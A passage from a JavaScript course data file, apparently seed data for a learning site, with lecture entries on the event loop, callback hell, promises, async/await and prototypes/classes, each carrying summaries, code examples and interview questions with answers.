        answer: 'setInterval(fn, 1000) does NOT guarantee exact 1000ms execution—if the main thread is busy or the browser tab is backgrounded/throttled, ticks can be delayed to 1050ms or paused entirely! Decrementing secondsLeft-- causes cumulative timer drift. Recomputing targetTimestamp - Date.now() on each tick compares against the real system clock so the timer stays 100% accurate even if the tab was minimized.'
      },
      {
        id: 'js-lec-16-q6',
        title: 'Q6: Why does reading inputElement.value always return a String even when the HTML input has type="number"?',
        difficulty: 'Easy',
        answer: 'In the DOM specification, HTMLInputElement.value is always typed as a DOMString. If a user types 50 into <input type="number">, input.value is "50", so input1.value + input2.value performs string concatenation ("50" + "20" = "5020"). Always wrap numeric inputs with Number(input.value) or input.valueAsNumber.'
      }
    ]
  },
  {
    topic_order: 17,
    slug: 'js-lecture-17-event-loop-single-threaded-web-apis-microtask-macrotask-queues',
    title: 'Lecture 17: Event Loop Architecture — Why JS Is Single-Threaded Synchronous, Web APIs, Callback Queue & Microtask Queue',
    duration_minutes: 49,
    video_url: 'http://www.youtube.com/watch?v=rsepF1ugeC8',
    video_title: 'Event Loop in Javascript | Why JS is Single threaded and synchronous| Javascript Full Course #17',
    doc_links: [
      {
        title: 'MDN Web Docs — The JavaScript Event Loop & Concurrency Model',
        url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Event_loop',
        link: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Event_loop'
      }
    ],
    short_description: 'Understand how single-threaded synchronous JavaScript achieves non-blocking concurrency using Browser Web APIs, the Macrotask (Callback) Queue, the higher-priority Microtask Queue, and the Event Loop.',
    summary_markdown: `### 📌 Topic Overview
Core JavaScript is a **Single-Threaded, Synchronous** language: it has only **one Call Stack** and **one Main Thread**, meaning it can execute only one instruction at a time from top to bottom. Yet JavaScript handles network requests (\`fetch\`), timers (\`setTimeout\`), and click listeners without freezing the UI—thanks to the runtime's **Web APIs**, **Task Queues**, and the **Event Loop**.

### 💡 The 5 Components of the JavaScript Runtime Architecture
1. **Call Stack (Inside JS Engine):** Executes synchronous JS code line-by-line (LIFO). If a heavy synchronous \`for\` loop runs 3 billion iterations on the Call Stack, the entire browser UI freezes because the single thread is blocked!
2. **Web APIs (Browser C++ Threads) / C++ APIs (Node.js libuv):** Features like \`setTimeout\`, \`fetch\`, DOM events, and \`localStorage\` are **not** part of JS—they belong to the host environment. When JS calls \`setTimeout(cb, 2000)\`, the Call Stack hands \`cb\` to the Web API timer and **immediately moves to the next line**.
3. **Callback Queue / Macrotask Queue (Task Queue):** Once a Web API timer finishes or a DOM click fires, its callback is pushed into the **Callback Queue**—it is **never** pushed directly onto the Call Stack (to prevent race conditions mid-execution).
4. **Microtask Queue (High Priority Queue):** Holds callbacks from **Promises (\`.then\`, \`.catch\`, \`.finally\`, \`await\`)** and \`MutationObserver\`. **The Microtask Queue has strictly higher priority than the Callback (Macrotask) Queue!**
5. **The Event Loop:** A continuous coordinator loop with one job:
   * Wait until the **Call Stack is completely empty** (all synchronous code has finished).
   * Drain **ALL** tasks in the **Microtask Queue** first until it is empty.
   * Pick the next task from the **Callback (Macrotask) Queue** and push it onto the Call Stack.

### 🛠️ Tracing Execution Order: Synchronous vs. Microtask vs. Macrotask
\`\`\`javascript
console.log("1. Start of Synchronous Script");

// Handed to Web API -> Queued in Macrotask (Callback) Queue
setTimeout(() => {
  console.log("4. setTimeout Callback (Macrotask Queue - Lower Priority)");
}, 0);

// Handed to Web API / Promise -> Queued in Microtask Queue
Promise.resolve().then(() => {
  console.log("3. Promise.then Callback (Microtask Queue - Higher Priority)");
});

console.log("2. End of Synchronous Script");

/* Exact Output Order:
   1. Start of Synchronous Script
   2. End of Synchronous Script
   3. Promise.then Callback (Microtask Queue - Higher Priority)
   4. setTimeout Callback (Macrotask Queue - Lower Priority)
*/
\`\`\``,
    interview_questions: [
      {
        id: 'js-lec-17-q1',
        title: 'Q1: If JavaScript is single-threaded, how can it run a 5-second timer or a fetch() request while still executing the next lines of code?',
        difficulty: 'Medium',
        answer: 'The JavaScript engine (V8) itself is single-threaded, meaning it has only one Call Stack. However, the surrounding Host Runtime (the Browser or Node.js) is written in multi-threaded C++! When JS calls setTimeout() or fetch(), V8 delegates the timer or network socket operation to the Browser\'s C++ Web APIs (or Node\'s libuv thread pool/OS kernel) and immediately pops the call off the Call Stack to continue running synchronous JS.'
      },
      {
        id: 'js-lec-17-q2',
        title: 'Q2: Why don\'t Web APIs push completed callbacks directly onto the Call Stack as soon as the timer expires?',
        difficulty: 'Medium',
        answer: 'Because JavaScript is single-threaded! If a Web API forcibly injected a callback into the middle of the Call Stack while another function was half-executed, it would interrupt synchronous execution and cause unpredictable race conditions and corrupted state. Instead, Web APIs place completed callbacks into the Queue, and the Event Loop waits until the Call Stack is 100% empty before pushing the next callback.'
      },
      {
        id: 'js-lec-17-q3',
        title: 'Q3: What is the difference between the Microtask Queue and the Callback (Macrotask) Queue? Which one executes first?',
        difficulty: 'Medium',
        answer: 'The Microtask Queue holds Promise callbacks (.then, .catch, .finally, code after await) and queueMicrotask(). The Macrotask (Callback) Queue holds setTimeout, setInterval, setImmediate, and DOM event callbacks. Whenever the Call Stack becomes empty, the Event Loop ALWAYS drains the entire Microtask Queue completely before executing even a single task from the Macrotask Queue!'
      },
      {
        id: 'js-lec-17-q4',
        title: 'Q4: If you call setTimeout(fn, 0) followed by a synchronous loop that takes 5 seconds, when does fn actually execute?',
        difficulty: 'Easy',
        answer: 'fn will execute AFTER at least 5 seconds! The 0ms parameter in setTimeout(fn, 0) is the minimum delay before the Web API places fn into the Callback Queue—NOT a guaranteed execution time. Because the Event Loop cannot move fn from the Callback Queue to the Call Stack until the synchronous 5-second loop finishes and the Global Execution Context pops off the Call Stack, fn waits the entire 5 seconds.'
      },
      {
        id: 'js-lec-17-q5',
        title: 'Q5: What is "Microtask Starvation" in the Event Loop?',
        difficulty: 'Hard',
        answer: 'Because the Event Loop continues draining the Microtask Queue until it is completely empty before moving to the Macrotask Queue or browser UI rendering, if a microtask recursively schedules another microtask (e.g., a Promise .then() that endlessly calls queueMicrotask() or Promise.resolve().then()), the Microtask Queue never empties—starving setTimeout callbacks and freezing the browser UI!'
      },
      {
        id: 'js-lec-17-q6',
        title: 'Q6: Why do all buttons and hover effects on a webpage freeze when a heavy synchronous while/for loop is running in JavaScript?',
        difficulty: 'Easy',
        answer: 'In the browser, the main thread handles both JavaScript Call Stack execution and UI rendering/repainting. While a heavy synchronous loop is occupying the Call Stack, the Event Loop is blocked from picking up click events from the Callback Queue and the browser cannot repaint the screen.'
      }
    ]
  },
  {
    topic_order: 18,
    slug: 'js-lecture-18-callback-hell-pyramid-of-doom-inversion-of-control',
    title: 'Lecture 18: Asynchronous Workflows & Callback Hell — Pyramid of Doom, Error Propagation & Inversion of Control',
    duration_minutes: 38,
    video_url: 'http://www.youtube.com/watch?v=CTJLBCYod9E',
    video_title: 'Callback Hell in JavaScript | Async Programming Tutorial | Javascript Full Course #18',
    doc_links: [
      {
        title: 'MDN Web Docs — Introducing Asynchronous JavaScript & Callbacks',
        url: 'https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Async_JS/Introducing',
        link: 'https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Async_JS/Introducing'
      }
    ],
    short_description: 'Model multi-step dependent asynchronous workflows (Order -> Prepare -> Pickup -> Deliver), understand why nested callbacks create Callback Hell, and analyze Inversion of Control.',
    summary_markdown: `### 📌 Topic Overview
In real-world applications (like a Zomato order pipeline), asynchronous tasks often depend sequentially on the completion of the previous step:
1. **\`placeOrder(orderDetail)\`** (Process payment first)
2. **\`preparingOrder(orderDetail)\`** (Notify restaurant only *after* payment succeeds)
3. **\`pickupOrder(orderDetail)\`** (Assign delivery partner only *after* food is prepared)
4. **\`deliverOrder(orderDetail)\`** (Deliver to customer only *after* order is picked up)

### 💡 Why Calling Async Functions Line-by-Line Fails
* If you call \`placeOrder(); preparingOrder();\` on consecutive lines, JavaScript does not wait for the 3-second payment timer inside \`placeOrder()\`—it immediately starts \`preparingOrder()\` before payment is even received!
* Before ES6 Promises existed, the only way to enforce sequential order was to pass the next step as a **Callback Function** into the previous step.

### 💡 What Is Callback Hell (The Pyramid of Doom)?
When 4 or more dependent asynchronous operations are nested inside each other using anonymous wrapper callbacks to pass data (\`orderDetail\`) forward, the code indents horizontally into a deeply nested triangle known as **Callback Hell**:

\`\`\`javascript
// Classic Callback Hell (Pyramid of Doom)
placedOrder(orderDetail, (orderDetail1) => {
  preparingOrder(orderDetail1, (orderDetail2) => {
    pickupOrder(orderDetail2, (orderDetail3) => {
      deliverOrder(orderDetail3);
    });
  });
});
\`\`\`

### 💡 The 3 Fatal Flaws of Callback Hell
1. **Unreadable & Unmaintainable Code (Pyramid of Doom):** Deeply nested anonymous callbacks passing arguments (\`orderDetail\`) down multiple levels are extremely hard for engineers to read or modify.
2. **Brittle Error Handling & Debugging:** If an error occurs at Step 2 (e.g., restaurant out of stock) or Step 3, there is no unified \`try...catch\` block—every single level must manually check and propagate errors.
3. **Inversion of Control (IoC — The Biggest Architectural Danger):** When you pass \`preparingOrder\` as a callback into \`placedOrder\` (which might be maintained by a different team or third-party payment SDK), you surrender control of your program's execution! If a bug in \`placedOrder\` forgets to call \`callback()\`, calls \`callback()\` **twice** (charging or preparing twice!), or passes corrupted arguments, your entire downstream pipeline breaks silently.

### 🛠️ Full Simulated Zomato Order Pipeline Using Callbacks
\`\`\`javascript
const orderDetail = {
  orderId: 123123,
  food: ["Pizza", "Biryani", "Coke"],
  cost: 620,
  customer_name: "Rohit",
  customer_location: "Dwarka",
  restaurant_location: "Delhi"
};

function placedOrder(orderDetail, callback) {
  console.log(\`₹\${orderDetail.cost} Payment is in progress...\`);
  setTimeout(() => {
    console.log("Payment received and order got placed!");
    orderDetail.status = true;
    callback(orderDetail);
  }, 3000);
}

function preparingOrder(orderDetail, callback) {
  console.log(\`Food preparation started for \${orderDetail.food}\`);
  setTimeout(() => {
    console.log("Your order is now prepared!");
    orderDetail.token = 123;
    callback(orderDetail);
  }, 3000);
}
\`\`\``,
    interview_questions: [
      {
        id: 'js-lec-18-q1',
        title: 'Q1: What are the two main problems with Callback-based asynchronous programming (Callback Hell and Inversion of Control)?',
        difficulty: 'Medium',
        answer: '1) Callback Hell (Pyramid of Doom): Nesting multiple dependent asynchronous callbacks inside one another creates deeply indented, horizontally sprawling code that is difficult to read, maintain, and debug. 2) Inversion of Control (IoC): By passing your continuation callback into an external or third-party function, you hand over control of when and how your code runs. You have to trust that the external function will call your callback exactly once, not zero times, not multiple times, and not synchronously or with wrong arguments.'
      },
      {
        id: 'js-lec-18-q2',
        title: 'Q2: Why did placedOrder(preparingOrder(pickupOrder)) crash and execute immediately out of order when passed without an arrow function wrapper?',
        difficulty: 'Easy',
        answer: 'Writing preparingOrder(pickupOrder) with parentheses invokes preparingOrder immediately at the moment arguments are evaluated—before placedOrder even starts running! And since preparingOrder returns undefined, placedOrder receives undefined instead of a function reference. Wrapping it in an arrow function () => preparingOrder(pickupOrder) delays execution until placedOrder explicitly invokes callback().'
      },
      {
        id: 'js-lec-18-q3',
        title: 'Q3: Why shouldn\'t placedOrder() simply hardcode a direct call to preparingOrder() at the end of its setTimeout block?',
        difficulty: 'Easy',
        answer: 'Hardcoding preparingOrder() inside placedOrder() tightly couples the two functions and destroys reusability. For example, if a user buys a digital gift card or chooses self-pickup where delivery/preparation steps differ, placedOrder() could not be reused. Passing the next action dynamically (or returning a Promise) keeps each step modular and decoupled.'
      },
      {
        id: 'js-lec-18-q4',
        title: 'Q4: Why does standard synchronous try { ... } catch (e) { ... } fail to catch errors thrown inside a setTimeout callback?',
        difficulty: 'Hard',
        answer: 'Because try...catch only catches errors that occur while that synchronous execution frame is still on the Call Stack! When setTimeout(cb, 3000) is called, the synchronous try...catch block finishes and pops off the Call Stack immediately. When cb finally runs 3 seconds later via the Event Loop, it executes in a brand-new Call Stack frame outside the original try...catch.'
      },
      {
        id: 'js-lec-18-q5',
        title: 'Q5: What is the Node.js "Error-First Callback" convention that was used before Promises?',
        difficulty: 'Medium',
        answer: 'In classic Node.js APIs (like fs.readFile), callbacks followed the signature (err, data) => { ... }, where the first parameter is reserved for an Error object (null if successful) and the second parameter holds the result data. Every nested level had to manually check if (err) return handleError(err); before proceeding.'
      },
      {
        id: 'js-lec-18-q6',
        title: 'Q6: How do Promises solve the Inversion of Control problem of callbacks?',
        difficulty: 'Medium',
        answer: 'With Promises, instead of passing your callback into a third-party function and hoping it calls you properly, the third-party function immediately returns a Promise object to you. JavaScript\'s native Promise specification guarantees that a Promise can only settle once (either fulfilled or rejected, never both and never twice) and that your attached .then() callback will be invoked predictably via the Microtask Queue.'
      }
    ]
  },
  {
    topic_order: 19,
    slug: 'js-lecture-19-promises-in-depth-states-chaining-fetch-json-vs-object',
    title: 'Lecture 19: JavaScript Promises & JSON vs. JS Objects — Promise States, .then/.catch/.finally, fetch & Custom Promises',
    duration_minutes: 72,
    video_url: 'http://www.youtube.com/watch?v=LYe1my0KkPo',
    video_title: 'Promises in Javascript | JSON vs JS Object| Javascript Full Course #19',
    doc_links: [
      {
        title: 'MDN Web Docs — Promise Built-In Object Reference',
        url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise',
        link: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise'
      }
    ],
    short_description: 'Master Promise lifecycle states (pending, fulfilled, rejected), consume APIs with fetch() and .then/.catch/.finally, contrast JSON with JS Objects, and build custom Promises to eliminate Callback Hell.',
    summary_markdown: `### 📌 Topic Overview
A **Promise** is a JavaScript object representing the eventual completion (or failure) of an asynchronous operation and its resulting value. Promises replace nested Callback Hell with flat, composable **Promise Chaining** and unified error handling.

### 💡 The 3 States of a Promise & Consuming Promises
1. **\`pending\`:** Initial state when the asynchronous operation is still in flight.
2. **\`fulfilled\` (Resolved):** The operation completed successfully and produced a value (handled by **\`.then(data => ...)\`**).
3. **\`rejected\`:** The operation failed and produced an error reason (handled by **\`.catch(err => ...)\`**).
* **\`.finally(() => ...)\`:** Runs unconditionally once the Promise settles (whether fulfilled or rejected)—ideal for hiding loading spinners or closing database connections.

### 💡 Crucial Interview Fact: When Does \`fetch()\` Reject vs. Resolve?
* A \`fetch()\` Promise **ONLY enters the \`rejected\` state** if the request could not reach the server at all (e.g., user internet disconnected, DNS lookup failure, or CORS block).
* If the server responds with **HTTP 404 (Not Found)** or **HTTP 500 (Internal Server Error)**, \`fetch()\` still considers the network round-trip **\`fulfilled\`**! You must manually inspect **\`if (!response.ok) throw new Error(...)\`** inside \`.then()\` to route HTTP errors into \`.catch()\`.

### 💡 JSON vs. JavaScript Object
* **JSON (JavaScript Object Notation):** A language-independent **text string format** for transmitting data between servers (C++, Java, Python, Go, Node.js) and clients.
* **Strict JSON Rules:** All keys **must be wrapped in double quotes** (\`"name": "Rohit"\`), strings must use double quotes, **no trailing commas** are allowed, and **functions, \`undefined\`, and \`Symbol\`s are forbidden**.
* **Conversion:** \`response.json()\` (async Promise) or \`JSON.parse(jsonString)\` converts JSON text into a JS Object; \`JSON.stringify(jsObj)\` serializes a JS Object into a JSON string.

### 🛠️ Code Examples: Custom Promises, Flat Chaining & \`fetch\` Error Handling
\`\`\`javascript
// 1. Creating a Custom Promise with new Promise((resolve, reject) => ...)
function placedOrder(orderDetail) {
  return new Promise((resolve, reject) => {
    console.log(\`₹\${orderDetail.cost} Payment is in progress...\`);
    setTimeout(() => {
      if (Math.random() > 0.1) {
        orderDetail.status = true;
        resolve(orderDetail); // Transitions Promise to 'fulfilled'
      } else {
        reject("Payment failed at bank gateway!"); // Transitions to 'rejected'
      }
    }, 2000);
  });
}

// 2. Flat Promise Chaining (Replaces Callback Hell!) + Unified .catch() & .finally()
placedOrder({ orderId: 101, cost: 620, food: ["Pizza"] })
  .then((orderDetail) => preparingOrder(orderDetail))
  .then((orderDetail) => pickupOrder(orderDetail))
  .then((orderDetail) => deliverOrder(orderDetail))
  .catch((error) => console.log("Order Pipeline Error:", error))
  .finally(() => console.log("Hide loading spinner / cleanup complete"));

// 3. Proper fetch() Consumption Checking response.ok
fetch("https://api.github.com/users")
  .then((response) => {
    if (!response.ok) {
      throw new Error("HTTP Error Status: " + response.status);
    }
    return response.json(); // Returns a Promise!
  })
  .then((users) => console.log("Fetched users count:", users.length))
  .catch((err) => console.log("Network or HTTP Error:", err.message));
\`\`\``,
    interview_questions: [
      {
        id: 'js-lec-19-q1',
        title: 'Q1: If an API endpoint returns an HTTP 404 Not Found or 500 Internal Server Error, does fetch() trigger the .catch() block automatically?',
        difficulty: 'Medium',
        answer: 'No! The fetch() Promise only rejects (triggering .catch()) on network-level failures where the browser could not communicate with the server at all (such as DNS failure, no internet connection, or CORS refusal). If the server responds with an HTTP 404 or 500 status code, the server DID respond, so fetch() resolves as fulfilled! To handle 404/500 in .catch(), you must check if (!response.ok) throw new Error(response.statusText) inside the first .then() block.'
      },
      {
        id: 'js-lec-19-q2',
        title: 'Q2: What are the exact differences between JSON and a JavaScript Object?',
        difficulty: 'Easy',
        answer: '1) Nature: A JavaScript Object is an in-memory runtime data structure tied to the JS engine; JSON (JavaScript Object Notation) is a language-agnostic plain-text string format understood by Python, Java, Go, C++, and JS. 2) Syntax Rules: In JSON, all property keys MUST be enclosed in double quotes ("key"), strings must use double quotes (no single quotes or backticks), and trailing commas are syntax errors. 3) Allowed Values: JSON cannot store functions, undefined, Symbols, or BigInts.'
      },
      {
        id: 'js-lec-19-q3',
        title: 'Q3: Why do we need two .then() calls when using fetch() (one for fetch() and a second for response.json())?',
        difficulty: 'Easy',
        answer: 'The first Promise returned by fetch(url) resolves as soon as the browser receives the initial HTTP response headers from the server—before the full response body stream has finished downloading! Calling response.json() reads the entire body stream asynchronously and parses the JSON text into a JS object, returning a second Promise that resolves with the parsed data.'
      },
      {
        id: 'js-lec-19-q4',
        title: 'Q4: What is the purpose of Promise.prototype.finally(), and how does it differ from .then() and .catch()?',
        difficulty: 'Easy',
        answer: '.finally(callback) executes whenever the Promise settles, regardless of whether it was fulfilled or rejected. Unlike .then() and .catch(), the .finally() callback receives no arguments (because it doesn\'t care whether the promise succeeded or failed) and automatically passes through the original resolved value or rejection error. It is used to avoid duplicating cleanup code—such as hiding a loading spinner or closing a DB connection.'
      },
      {
        id: 'js-lec-19-q5',
        title: 'Q5: What happens if you forget the return keyword inside a .then() callback during Promise Chaining?',
        difficulty: 'Medium',
        answer: 'In a Promise chain, each .then() passes its return value to the next .then() in the chain. If you forget to write return preparingOrder(orderDetail) inside a multi-line .then({ ... }) block, that function implicitly returns undefined, causing the next .then() in the chain to fire immediately with undefined instead of waiting for preparingOrder\'s Promise to resolve!'
      },
      {
        id: 'js-lec-19-q6',
        title: 'Q6: Can a Promise change its state from fulfilled to rejected (or vice versa) if resolve() and reject() are both called inside new Promise()?',
        difficulty: 'Medium',
        answer: 'No. Once a Promise transitions from pending to either fulfilled (via resolve) or rejected (via reject), it is permanently "settled" and immutable. Any subsequent calls to resolve() or reject() inside the executor function are silently ignored.'
      }
    ]
  },
  {
    topic_order: 20,
    slug: 'js-lecture-20-async-await-try-catch-promise-all-concurrency',
    title: 'Lecture 20: async / await & Concurrent Promises — try...catch Error Handling, Top-Level await & Promise.all()',
    duration_minutes: 49,
    video_url: 'http://www.youtube.com/watch?v=AyBpssNYB6g',
    video_title: 'Async Await in Javascript | Javascript Full Course #20',
    doc_links: [
      {
        title: 'MDN Web Docs — async function & await Operator',
        url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function',
        link: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function'
      },
      {
        title: 'MDN Web Docs — Promise.all() Concurrency Reference',
        url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/all',
        link: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/all'
      }
    ],
    short_description: 'Write clean asynchronous code with async/await and try...catch, understand how async functions yield control without freezing the main thread, and eliminate sequential waterfalls using Promise.all().',
    summary_markdown: `### 📌 Topic Overview
Introduced in ES2017 (ES8), **\`async\`** and **\`await\`** allow you to write asynchronous Promise-based code that reads like clean, top-to-bottom synchronous code—eliminating both Callback Hell and verbose \`.then()\` chains.

### 💡 Core Rules of \`async\` and \`await\`
* **Rule 1 — An \`async\` Function ALWAYS Returns a Promise:**
  * If you write \`async function greet() { return "Rohit"; }\`, JavaScript automatically wraps \`"Rohit"\` inside \`Promise.resolve("Rohit")\`.
* **Rule 2 — How \`await\` Works Without Freezing the Main Thread:**
  * Always place \`await\` **inside** an \`async\` function (avoid bare top-level \`await\` in UI scripts because top-level \`await\` pauses the entire module!).
  * When JavaScript hits \`const response = await fetch(url)\` inside an \`async\` function, it **suspends only that \`async\` function**, pops it off the Call Stack, and immediately returns to execute synchronous code outside the function (like rendering UI or logging \`"Hello Ji"\`). Once the Promise resolves, the rest of the \`async\` function resumes via the Microtask Queue!
* **Rule 3 — Error Handling with \`try...catch\`:**
  * Wrap \`await\` calls in a standard \`try { ... } catch (error) { ... }\` block, and check \`if (!response.ok) throw new Error(...)\` for HTTP errors.

### 💡 Sequential Waterfall vs. Parallel Execution with \`Promise.all()\`
* **The Sequential Waterfall Trap:** If a dashboard needs 3 **independent** API calls (\`comments\`, \`photos\`, \`chat\`), writing three separate \`await\` lines one after another forces them to run sequentially (2s + 2s + 2s = 6s).
* **The \`Promise.all()\` Solution:** Fire all independent Promises in parallel and await them together in O(max(t1, t2, t3)) = 2s:
  \`const [comments, photos, chat] = await Promise.all([fetch(u1), fetch(u2), fetch(u3)]);\`

### 🛠️ Code Examples: \`async/await\` Pipeline & \`Promise.all()\` Concurrency
\`\`\`javascript
// 1. Clean Zomato Order Pipeline Using async/await + try...catch
async function processOrder(orderDetail) {
  try {
    const res1 = await placedOrder(orderDetail);
    const res2 = await preparingOrder(res1);
    const res3 = await pickupOrder(res2);
    const res4 = await deliverOrder(res3);
    console.log("Final Order Status:", res4);
  } catch (error) {
    console.log("Order failed:", error);
  }
}

// 2. Fetching GitHub Users with response.ok Check
async function loadGitHubUsers() {
  try {
    const response = await fetch("https://api.github.com/users");
    if (!response.ok) {
      throw new Error("Data is not present (HTTP " + response.status + ")");
    }
    const users = await response.json();
    console.log("Loaded", users.length, "GitHub profiles");
  } catch (error) {
    console.log("Error:", error.message);
  }
}

// 3. Running 3 Independent Requests in Parallel with Promise.all()
async function fetchUserDashboard() {
  const [comments, photos, chat] = await Promise.all([
    fetch("/api/user/comments"),
    fetch("/api/user/photos"),
    fetch("/api/user/chat")
  ]);
}
\`\`\``,
    interview_questions: [
      {
        id: 'js-lec-20-q1',
        title: 'Q1: What does an async function return if you return a plain string like return "Rohit" inside it?',
        difficulty: 'Easy',
        answer: 'An async function ALWAYS returns a Promise! If you return a non-Promise value like "Rohit", JavaScript automatically wraps it in a fulfilled Promise (equivalent to return Promise.resolve("Rohit")). If you throw an error inside an async function, it returns a rejected Promise.'
      },
      {
        id: 'js-lec-20-q2',
        title: 'Q2: Does the await keyword block the JavaScript main thread / Call Stack? Why should await be used inside an async function rather than at the top level?',
        difficulty: 'Medium',
        answer: 'When used inside an async function, await does NOT block the main thread! As soon as await encounters a pending Promise, the engine suspends that specific async function\'s execution context, pops it off the Call Stack, and continues executing synchronous code outside the async function. However, using bare top-level await outside an async function blocks the execution of the rest of that module until the Promise settles, which can freeze downstream initialization.'
      },
      {
        id: 'js-lec-20-q3',
        title: 'Q3: When should you use sequential await vs. await Promise.all([...])?',
        difficulty: 'Medium',
        answer: 'Use sequential await ONLY when the second asynchronous operation depends on the output of the first (for example, const response = await fetch(url); const data = await response.json(); or passing an orderId from step 1 into step 2). When multiple asynchronous tasks are independent of each other (e.g., fetching user comments, user photos, and chat history, or connecting to 3 databases), always use await Promise.all([p1, p2, p3]) so all requests run in parallel instead of waiting in a slow sequential waterfall.'
      },
      {
        id: 'js-lec-20-q4',
        title: 'Q4: What happens in Promise.all([p1, p2, p3]) if p2 rejects, and how does Promise.allSettled() differ?',
        difficulty: 'Medium',
        answer: 'Promise.all() is "all-or-nothing" (fail-fast): if even one Promise (p2) rejects, Promise.all() immediately rejects with p2\'s error, discarding the results of p1 and p3. If you want all Promises to finish regardless of individual failures (e.g., showing partial dashboard widgets even if one widget API fails), use Promise.allSettled([p1, p2, p3]), which waits for all of them and returns an array of { status: "fulfilled", value } or { status: "rejected", reason } objects.'
      },
      {
        id: 'js-lec-20-q5',
        title: 'Q5: Trace the exact console output order: async function fn() { console.log("A"); await Promise.resolve(); console.log("B"); } console.log("C"); fn(); console.log("D");',
        difficulty: 'Hard',
        answer: 'The exact output is: C -> A -> D -> B. First, synchronous "C" logs. Next, fn() is called and its synchronous body up to the first await runs immediately, logging "A". When await Promise.resolve() is reached, fn() is suspended and the rest of fn() (logging "B") is scheduled into the Microtask Queue. Synchronous execution continues in the global scope, logging "D". Finally, once the Call Stack is empty, the Microtask Queue runs and logs "B".'
      },
      {
        id: 'js-lec-20-q6',
        title: 'Q6: Why can async/await use a standard synchronous try...catch block to catch asynchronous Promise rejections, whereas setTimeout callbacks could not?',
        difficulty: 'Medium',
        answer: 'Because the JavaScript compiler transforms async/await under the hood into a state machine (similar to generators and Promises). When an awaited Promise rejects, the engine resumes the suspended async function execution context back on the Call Stack and throws the rejection reason right at the await point—inside the active try...catch block!'
      }
    ]
  },
  {
    topic_order: 21,
    slug: 'js-lecture-21-prototypes-prototype-chain-es6-classes-inheritance',
    title: 'Lecture 21: Prototypes, Prototype Chain (__proto__) & ES6 Classes — Object.create, extends, super() & Method Sharing',
    duration_minutes: 48,
    video_url: 'http://www.youtube.com/watch?v=9KwCG9aVwvQ',
    video_title: 'Prototypes and class in Javascript| Javascript Full Course #21',
    doc_links: [
      {
        title: 'MDN Web Docs — Inheritance and the Prototype Chain',
        url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain',
        link: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain'
      },
      {
        title: 'MDN Web Docs — ES6 Classes Reference',
        url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes',
        link: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes'
      }
    ],
    short_description: 'Uncover how Prototypal Inheritance powers every Object, Array, and Function in JavaScript, trace the Prototype Chain up to null, and master ES6 Classes, extends, and super().',
    summary_markdown: `### 📌 Topic Overview
When you create an array \`const arr = [10, 20]\` or an object \`const obj = { name: "Rohit" }\`, how can you call \`arr.push()\`, \`arr.toString()\`, or \`obj.hasOwnProperty("name")\` when you never defined those methods on \`arr\` or \`obj\`? The answer is **Prototypal Inheritance**—the core mechanism behind all objects and classes in JavaScript.

### 💡 The Prototype Chain (\`[[Prototype]]\` / \`__proto__\`)
* Every JavaScript object has a hidden internal link (\`[[Prototype]]\`, accessible via \`Object.getPrototypeOf(obj)\` or \`__proto__\`) pointing to another object called its **Prototype**.
* When you access \`obj.prop\`, the engine first searches \`obj\` itself. If not found, it walks up the **Prototype Chain** one level at a time until it either finds the property or reaches **\`null\`** at the top of the chain:
  * **Object Chain:** \`obj -> Object.prototype -> null\`
  * **Array Chain:** \`arr -> Array.prototype -> Object.prototype -> null\`
  * **Function Chain:** \`fn -> Function.prototype -> Object.prototype -> null\`
* Because both \`Array.prototype\` and \`Function.prototype\` inherit from **\`Object.prototype\`**, Arrays and Functions are ultimately **Objects** in JavaScript!
* **Custom Prototype Linking:** Use **\`const obj2 = Object.create(obj1)\`** to create a new object whose prototype points directly to \`obj1\`.

### 💡 ES6 \`class\`, \`constructor\`, \`extends\` & \`super()\` (DRY Principle)
* If you create 100 user object literals manually, defining a \`sayHi()\` method inside each object duplicates that function 100 times in memory!
* **How ES6 \`class\` Works Under the Hood:**
  * Instance data properties (\`this.name\`, \`this.age\`) set inside \`constructor(name, age)\` are placed on each individual instance object.
  * Class methods (\`sayHi()\`) are automatically placed **once** on **\`Person.prototype\`** so all 100 instances share a single method in memory (following the **DRY — Don't Repeat Yourself** principle)!
* **Class Inheritance (\`extends\` & \`super\`):** \`class Customer extends Person\` links \`Customer.prototype\` to \`Person.prototype\`, and calling **\`super(name, age)\`** inside the child \`constructor\` invokes the parent \`Person\` constructor to initialize inherited properties.

### 🛠️ Code Examples: Prototype Chain, \`Object.create\` & ES6 Class Inheritance
\`\`\`javascript
// 1. Verifying the Prototype Chain of an Array up to null
const arr = [10, 20, 30];
console.log(arr.__proto__ === Array.prototype);                  // true
console.log(arr.__proto__.__proto__ === Object.prototype);       // true
console.log(arr.__proto__.__proto__.__proto__ === null);         // true

// 2. Linking Prototypes Cleanly with Object.create()
const baseUser = { greet() { return \`Hello \${this.name}\`; } };
const admin = Object.create(baseUser);
admin.name = "Rohit";
console.log(admin.greet()); // "Hello Rohit" (inherited via prototype chain)

// 3. ES6 Classes, Prototype Method Sharing & Inheritance (extends + super)
class Person {
  constructor(name, age) {
    this.name = name;
    this.age = age;
  }
  sayHi() {
    return \`Hi \${this.name}\`;
  }
}

class Customer extends Person {
  constructor(name, age, account, balance) {
    super(name, age); // Calls Person's constructor first!
    this.account = account;
    this.balance = balance;
  }
  checkBalance() {
    return this.balance;
  }
}

const c1 = new Customer("Mohan", 20, 1002, 5400);
console.log(c1.sayHi(), c1.checkBalance()); // "Hi Mohan", 5400
\`\`\``,
    interview_questions: [
      {
        id: 'js-lec-21-q1',
        title: 'Q1: Trace the complete Prototype Chain of a JavaScript Array const arr = [1, 2, 3]. Why does arr.toString() work, and where does the chain end?',
        difficulty: 'Medium',
